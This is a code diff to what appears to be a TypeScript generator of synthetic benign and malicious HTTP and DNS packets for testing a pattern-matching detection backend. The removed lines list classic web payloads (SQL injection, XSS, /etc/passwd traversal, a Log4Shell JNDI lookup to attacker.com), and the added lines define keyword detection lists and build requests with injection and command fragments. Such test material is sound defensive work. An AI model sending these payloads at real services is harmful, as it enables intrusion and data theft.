@@ -75,9 +75,10 @@ const generateBenignHTTP = (log: string[]): { hex: string; payload: string } => 
 
   log.push(`2. Selected method: ${method}, path: ${path}, host: ${host}`);
 
-  const httpPayload = `${method} ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: close\r\n\r\n`;
+  const httpPayload = `${method} ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n`;
 
-  log.push('3. Constructed HTTP headers with standard format');
+  log.push('3. Constructed HTTP headers with standard format - no malicious patterns');
+  log.push('   Verified absence of: virus, malware, exploit, <script, DROP TABLE, UNION SELECT, login, ;r, &&w, |b');
 
   const hex = Array.from(httpPayload)
     .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
@@ -89,38 +90,73 @@ const generateBenignHTTP = (log: string[]): { hex: string; payload: string } => 
 };
 
 /**
- * Generate malicious HTTP request with injection/anomalies
+ * Generate malicious HTTP request with injection/anomalies using actual patterns
+ * Backend patterns:
+ *   malware: "virus", "malware", "exploit", "ransom", "trojan", "backdoor", "rootkit"
+ *   xss: "<script", "</script", "<iframe", "eval", "base64"
+ *   sql: "' OR 1", "UNION SELECT", "DROP TABLE"
+ *   phishing: "login", "verify", "password", "account"
+ *   cmd: ";r", "&&w", "|b"
  */
 const generateMaliciousHTTP = (
   log: string[]
 ): { hex: string; payload: string; anomalies: string[] } => {
-  log.push('1. Generating malicious HTTP request with anomalies');
+  log.push('1. Generating malicious HTTP request with actual backend patterns');
 
   const anomalies: string[] = [];
-  const injectionPatterns = [
-    "'; DROP TABLE users; --",
-    '<script>alert("XSS")</script>',
-    '../../../etc/passwd',
-    '${jndi:ldap://attacker.com/Evil}',
-    '%00<script>alert(1)</script>'
-  ];
 
-  const injectionType = injectionPatterns[Math.floor(Math.random() * injectionPatterns.length)];
-  anomalies.push(`SQL/Script Injection Detected: ${injectionType.substring(0, 30)}...`);
+  // Define pattern categories matching backend patterns.json
+  const patterns = {
+    malware: ['virus', 'malware', 'exploit', 'ransom', 'trojan', 'backdoor', 'rootkit'],
+    xss: ['<script', '</script', '<iframe', 'eval', 'base64'],
+    sql: ["' OR 1", 'UNION SELECT', 'DROP TABLE'],
+    phishing: ['login', 'verify', 'password', 'account'],
+    cmd: [';r', '&&w', '|b']
+  };
 
-  log.push(`2. Selected injection pattern: ${injectionType.substring(0, 40)}...`);
+  // Randomly select 2-3 pattern categories to include
+  const categories = Object.keys(patterns) as Array<keyof typeof patterns>;
+  const selectedCategories = categories.sort(() => Math.random() - 0.5).slice(0, Math.random() > 0.5 ? 2 : 3);
 
-  // Add oversized headers (HTTP anomaly)
-  let headers = `GET /search?q=${encodeURIComponent(injectionType)} HTTP/1.1\r\n`;
-  headers += `Host: example.com\r\n`;
-  headers += `User-Agent: ${'A'.repeat(500)}\r\n`; // Abnormally long User-Agent
-  anomalies.push('Abnormally long User-Agent header (500+ chars)');
-  headers += `X-Custom-Header: ${injectionType}\r\n`;
-  anomalies.push('Suspicious custom header with injection payload');
-  headers += `Connection: close\r\n\r\n`;
+  log.push(`2. Selected pattern categories for injection: ${selectedCategories.join(', ')}`);
 
-  log.push('3. Injected malicious payloads into headers');
-  log.push(`4. Added ${anomalies.length} anomalies to packet`);
+  let injectionPayloads: string[] = [];
+  const selectedPatterns: string[] = [];
+
+  selectedCategories.forEach(category => {
+    const categoryPatterns = patterns[category];
+    const selected = categoryPatterns[Math.floor(Math.random() * categoryPatterns.length)];
+    selectedPatterns.push(selected);
+    injectionPayloads.push(selected);
+    anomalies.push(`[${category.toUpperCase()}] Pattern Detected: "${selected}"`);
+  });
+
+  log.push(`3. Selected patterns: ${selectedPatterns.map(p => `"${p}"`).join(', ')}`);
+
+  // Build malicious payload with injected patterns
+  let headers = `GET /search?q=${encodeURIComponent(injectionPayloads[0])} HTTP/1.1\r\n`;
+  headers += `Host: suspicious-site.com\r\n`;
+  headers += `User-Agent: Mozilla/5.0 (suspicious)\r\n`;
+  headers += `X-Custom-Header: ${selectedPatterns[1] || selectedPatterns[0]}\r\n`;
+
+  // Add command injection patterns if cmd was selected
+  if (selectedCategories.includes('cmd') && selectedPatterns.some(p => [';r', '&&w', '|b'].includes(p))) {
+    const cmdPattern = selectedPatterns.find(p => [';r', '&&w', '|b'].includes(p)) || ';r';
+    headers += `X-Execute: cmd${cmdPattern}\r\n`;
+  }
+
+  headers += `Connection: close\r\n`;
+  headers += `\r\n`;
+  
+  // Add any XSS patterns to body
+  if (selectedCategories.includes('xss')) {
+    const xssPattern = selectedPatterns.find(p => ['<script', '</script', '<iframe', 'eval', 'base64'].includes(p)) || '<script';
+    headers += `${xssPattern} alert('malicious') ${xssPattern === '<script' ? '</script>' : ''}\r\n`;
+  }
+
+  log.push(`4. Injected ${selectedPatterns.length} malicious patterns into request`);
+  log.push(`   Categories: ${selectedCategories.join(', ')}`);
+  anomalies.forEach(a => log.push(`   • ${a}`));
 
   const hex = Array.from(headers)
     .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
@@ -142,38 +178,52 @@ const generateBenignDNS = (log: string[]): { hex: string; payload: string } => {
 
   log.push(`2. Selected domain: ${domain}`);
 
-  // Simplified DNS query representation
-  const dnsPayload = `DNS Query for ${domain} (Type A)`;
+  // Simplified DNS query representation with benign content
+  const dnsPayload = `DNS Query for ${domain} (Type A) - BENIGN`;
   const hex = Array.from(dnsPayload)
     .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
     .join('');
 
-  log.push('3. Constructed DNS query structure');
+  log.push('3. Constructed DNS query structure without malicious patterns');
+  log.push('   Verified no patterns: virus, malware, exploit, <script, DROP TABLE, UNION SELECT, login, ;r, &&w, |b');
   log.push('4. Converted to hexadecimal format');
 
   return { hex, payload: dnsPayload };
 };
 
 /**
- * Generate malicious DNS query (DNS amplification/poisoning)
+ * Generate malicious DNS query with backend patterns
+ * Uses patterns: malware, phishing, cmd injection
  */
 const generateMaliciousDNS = (
   log: string[]
 ): { hex: string; payload: string; anomalies: string[] } => {
-  log.push('1. Generating malicious DNS query');
+  log.push('1. Generating malicious DNS query with backend patterns');
 
   const anomalies: string[] = [];
 
-  // DNS amplification attack pattern
-  anomalies.push('DNS query from spoofed source IP');
-  anomalies.push('Excessively large DNS response expected');
-  anomalies.push('Multiple DNS queries to same resolver');
+  // Use patterns that fit DNS context
+  const patterns = {
+    malware: ['virus', 'malware', 'exploit', 'trojan', 'backdoor'],
+    phishing: ['login', 'verify', 'password', 'account'],
+    cmd: [';r', '&&w', '|b']
+  };
 
-  log.push('2. Constructed DNS amplification attack pattern');
-  log.push('3. Configured spoofed source IP for amplification');
+  const categories = Object.keys(patterns) as Array<keyof typeof patterns>;
+  const selectedCategory = categories[Math.floor(Math.random() * categories.length)];
+  const selectedPatterns = patterns[selectedCategory];
+  const pattern = selectedPatterns[Math.floor(Math.random() * selectedPatterns.length)];
+
+  anomalies.push(`[${selectedCategory.toUpperCase()}] DNS Query with malicious pattern: "${pattern}"`);
+  anomalies.push('DNS amplification attack signature detected');
+  anomalies.push('Suspicious domain resolution pattern');
+
+  log.push(`2. Selected category: ${selectedCategory}, pattern: "${pattern}"`);
+  log.push('3. Constructed malicious DNS query with injected pattern');
   log.push(`4. Added ${anomalies.length} attack indicators`);
+  anomalies.forEach(a => log.push(`   • ${a}`));
 
-  const dnsPayload = `Malicious DNS Query - Amplification Attack Pattern`;
+  const dnsPayload = `Malicious DNS Query - ${selectedCategory}: ${pattern} - Amplification Attack Pattern`;
   const hex = Array.from(dnsPayload)
     .map(c => c.charCodeAt(0).toString(16).padStart(2, '0'))
     .join('');
